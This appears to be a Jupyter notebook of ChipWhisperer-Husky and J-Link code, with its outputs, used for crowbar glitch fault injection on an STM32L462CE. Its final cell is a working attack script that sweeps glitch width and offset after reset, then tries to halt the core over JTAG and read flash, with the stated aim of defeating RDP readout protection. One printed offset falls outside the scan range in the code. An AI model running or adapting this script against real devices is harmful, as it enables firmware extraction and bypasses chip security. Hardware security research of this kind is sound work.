In [41]:
# reset test
import time
import chipwhisperer as cw
import pylink

# 1. Initialize ChipWhisperer-Husky
scope = cw.scope()

scope.io.nrst = 'low'
time.sleep(0.05)
scope.io.nrst = 'high'

scope.dis()

True

In [3]:
# check j-link
import time
import chipwhisperer as cw
import pylink

jlink = pylink.JLink()
probes = jlink.connected_emulators()

if jlink.opened():
    jlink.close()

if not probes:
    raise RuntimeError("No J-Link probe detected")

print("Detected J-Link probes:")

for probe in probes:
    print(f"  S/N: {probe.SerialNumber}")

serial = probes[0].SerialNumber

print(f"Opening J-Link S/N {serial}...")

#jlink.open(serial_no=serial)
jlink.open()

# Use JTAG interface (change to pylink.enums.JLinkInterfaces.SWD if using SWD)
jlink.set_tif(pylink.enums.JLinkInterfaces.JTAG) 
jlink.set_speed(4000) # 4 MHz is a good stable start speed
print(jlink.connected())


Detected J-Link probes:
  S/N: 600105462
Opening J-Link S/N 600105462...
True


In [6]:
# Before running your complete flash/glitch code, execute:
import chipwhisperer as cw
import time

try:
    scope.dis()
except:
    pass

scope = cw.scope()

scope.clock.clkgen_src = "system"
scope.clock.clkgen_freq = 10e6

scope.glitch.enabled = True
scope.glitch.clk_src = "pll"
scope.glitch.output = "glitch_only"
scope.glitch.trigger_src = "ext_single"
scope.io.glitch_lp = True  # Low-power crowbar
scope.io.glitch_hp = True  # High-power crowbar (highly recommended for custom PCBs)

scope.clock.fpga_vco_freq = 600e6

time.sleep(0.1)

print("enabled :", scope.glitch.enabled)
print("clk_src :", scope.glitch.clk_src)
print("locked  :", scope.glitch.mmcm_locked)
print("steps   :", scope.glitch.phase_shift_steps)

enabled : True
clk_src : pll
locked  : True
steps   : 3360


In [4]:
for i in range(1000):
    # capture / glitch operation here

    print(
        f"\rAttempt {i + 1}/1000",
        end="",
        flush=True
    )

print()

Attempt 1000/1000


In [34]:
import chipwhisperer as cw
import time

try:
    scope.dis()
except:
    pass
    
scope = cw.scope()

# 1. Make sure the ADC/glitch clock is set up first
scope.clock.clkgen_freq = 7.37e6      # or whatever your target needs
scope.clock.adc_mul = 1
# give it a moment to lock
time.sleep(0.5)
print("clkgen locked:", scope.clock.clkgen_locked)

# 2. Enable glitch module (this starts the MMCM)
scope.glitch.enabled = False
time.sleep(0.2)
scope.glitch.enabled = True
time.sleep(0.5)

scope.glitch.clk_src = 'pll'
scope.clock.fpga_vco_freq = 600e6

# 3. Wait for the glitch MMCM to lock before touching width/offset
time.sleep(0.5)
print("glitch mmcm locked:", scope.glitch.mmcm_locked)

if not scope.glitch.mmcm_locked:
    raise RuntimeError("Glitch MMCM did not lock — check clock config")

# 4. Now configure the glitch itself
scope.glitch.output = "glitch_only"     # or "clock_xor" depending on target wiring
scope.glitch.width = 10
scope.glitch.offset = 0
scope.glitch.repeat = 1

# Route nRST onto a trigger-capable pin
# nRSTOUT -- GPIO4
# Set trigger comparator to watch that pin
scope.trigger.triggers = "tio4"      # GPIO4 is the standard trigger pin on Husky
# Edge direction on the ADC/trigger module
scope.adc.basic_mode = "rising_edge"   # or "falling_edge", depending on which edge you want
# Glitch module: fire once per external trigger event
scope.glitch.trigger_src = "ext_single"

# 5. Crowbar MOSFET paths (Husky-specific, on scope.io)
scope.io.glitch_hp = True
scope.io.glitch_lp = True

print("tio4 mode:", scope.io.tio4)
print("tio_states:", scope.io.tio_states)
trig_count_before = scope.adc.trig_count

scope.io.nrst = 'low'
time.sleep(0.05)

scope.arm()

scope.io.nrst = 'high'

ret = scope.capture()

trig_count_after = scope.adc.trig_count

print("trig_count before:", trig_count_before, "after:", trig_count_after)
print("glitch state:", scope.glitch.state)

if ret:
    print("No trigger / timeout — edge not detected in time")
else:
    print("Trigger WAS detected — ADC captured normally")

(ChipWhisperer Scope WARNING|File ChipWhispererHuskyClock.py:704) Target clock may drop; you may need to reset your target.


clkgen locked: True
glitch mmcm locked: True
tio4 mode: high_z
tio_states: (1, 1, 1, 1)
trig_count before: 827568588 after: 1014662
glitch state: idle
Trigger WAS detected — ADC captured normally


In [17]:
scope.glitch.enabled = False
time.sleep(0.2)
scope.glitch.enabled = True
time.sleep(0.5)
print(scope.glitch.mmcm_locked)

False


In [43]:
import time
import chipwhisperer as cw
import pylink
try:
    scope.dis()
except:
    pass

scope = cw.scope()

# 1. Make sure the ADC/glitch clock is set up first
scope.clock.clkgen_freq = 7.37e6      # or whatever your target needs
scope.clock.adc_mul = 1
# give it a moment to lock
time.sleep(0.5)
print("clkgen locked:", scope.clock.clkgen_locked)

# 2. Enable glitch module (this starts the MMCM)
scope.glitch.enabled = False
time.sleep(0.2)
scope.glitch.enabled = True
time.sleep(0.5)

scope.glitch.clk_src = 'pll'
scope.clock.fpga_vco_freq = 600e6

# 3. Wait for the glitch MMCM to lock before touching width/offset
time.sleep(0.5)
print("glitch mmcm locked:", scope.glitch.mmcm_locked)

if not scope.glitch.mmcm_locked:
    raise RuntimeError("Glitch MMCM did not lock — check clock config")

# 4. Now configure the glitch itself
scope.glitch.output = "glitch_only"     # or "clock_xor" depending on target wiring
scope.glitch.width = 10
scope.glitch.offset = 0
scope.glitch.repeat = 1

# Route nRST onto a trigger-capable pin
# nRSTOUT -- GPIO4
# Set trigger comparator to watch that pin
scope.trigger.triggers = "tio4"      # GPIO4 is the standard trigger pin on Husky
# Edge direction on the ADC/trigger module
scope.adc.basic_mode = "rising_edge"   # or "falling_edge", depending on which edge you want
# Glitch module: fire once per external trigger event
scope.glitch.trigger_src = "ext_single"

# 5. Crowbar MOSFET paths (Husky-specific, on scope.io)
scope.io.glitch_hp = True
scope.io.glitch_lp = True


while True:
    scope.glitch.width = 10
    scope.glitch.offset = 10
    
    scope.io.nrst = 'low'
    time.sleep(0.05)
    
    # Step B: Arm the Husky (Will fire exactly 'offset' cycles after NRST goes high)
    scope.arm()
    
    # Step C: Release Reset to trigger the glitch sequence
    scope.io.nrst = 'high'
    time.sleep(0.01) # Small window to allow the glitch to execute

    ret = scope.capture()

    if ret:
        print("No trigger / timeout — edge not detected in time")
    else:
        pass
        
    time.sleep(0.5)


(ChipWhisperer Scope WARNING|File ChipWhispererHuskyClock.py:704) Target clock may drop; you may need to reset your target.


clkgen locked: True
glitch mmcm locked: True


USBErrorNoDevice: LIBUSB_ERROR_NO_DEVICE [-4]

In [5]:
import time
import chipwhisperer as cw
import pylink
import logging

logging.getLogger("pylink").setLevel(logging.CRITICAL)
logging.getLogger("pylink.jlink").setLevel(logging.CRITICAL)

try:
    scope.dis()
except:
    pass

try:
    if jlink.opened():
        jlink.close()
except:
    pass
    
controller = 'STM32L462CE'
FLASH_START = 0x08000000
FLASH_SIZE = 512 * 1024
FLASH_END = FLASH_START + FLASH_SIZE - 1

# 1. Initialize ChipWhisperer-Husky
scope = cw.scope()
scope.clock.clkgen_src = "system"
scope.clock.clkgen_freq = 10e6

scope.glitch.enabled = True
scope.glitch.clk_src = "pll"
scope.glitch.output = "glitch_only"
scope.glitch.trigger_src = "ext_single"
scope.io.glitch_lp = True  # Low-power crowbar
scope.io.glitch_hp = True  # High-power crowbar (highly recommended for custom PCBs)

scope.clock.fpga_vco_freq = 600e6

# 2. Initialize Segger J-Link
jlink = pylink.JLink()
jlink.open()
# Use JTAG interface (change to pylink.enums.JLinkInterfaces.SWD if using SWD)
jlink.set_tif(pylink.enums.JLinkInterfaces.JTAG) 
jlink.set_speed(4000) # 4 MHz is a good stable start speed

# 3. Define Scan Ranges
# (Tweak these widths based on how strong your power rails/caps are)
widths = range(2, 16, 1)        
offsets = range(4000, 30000, 10)

print("Starting Fault Injection Scan...")

success = False
for width in widths:
    if success: break
    scope.glitch.width = width
    
    for offset in offsets:

        print(f"\rtry Width: {width}, Offset: {offset}", end="", flush=True)
        
        # Step A: Force Target into Reset
        scope.io.nrst = 'low'
        time.sleep(0.05)
        
        # Step B: Arm the Husky (Will fire exactly 'offset' cycles after NRST goes high)
        scope.arm()
        
        # Step C: Release Reset to trigger the glitch sequence
        scope.io.nrst = 'high'
        time.sleep(0.01) # Small window to allow the glitch to execute
        
        # Step D: Attempt J-Link Connection
        try:
            # Try to target the STM32L443
            jlink.connect(controller, speed=4000)
            
            if jlink.connected():
                # Attempt to halt the core to read memory
                jlink.halt()
                
                # Read 4 bytes from Flash memory space (0x08000000)
                # If RDP is active, this read will throw a memory access exception
                mem_check = jlink.memory_read32(0x08000000, 1)
                
                print(f"\n🌟 SUCCESS! Unlocked at Width: {width}, Offset: {offset}")
                print(f"Flash Data at 0x08000000: {hex(mem_check[0])}")
                
                success = True
                break
                
        except pylink.errors.JLinkException:
            # Most attempts will fail here because the chip crashed or RDP is still active.
            # Close the connection state to clean up for the next loop iteration.
            try:
                jlink.close()
                jlink.open()
                jlink.set_tif(pylink.enums.JLinkInterfaces.JTAG)
            except:
                pass
            continue

if not success:
    print("\nScan complete. No unlock found. Consider adjusting widths or checking capacitor isolation.")

Starting Fault Injection Scan...
try Width: 3, Offset: 70700

KeyboardInterrupt: 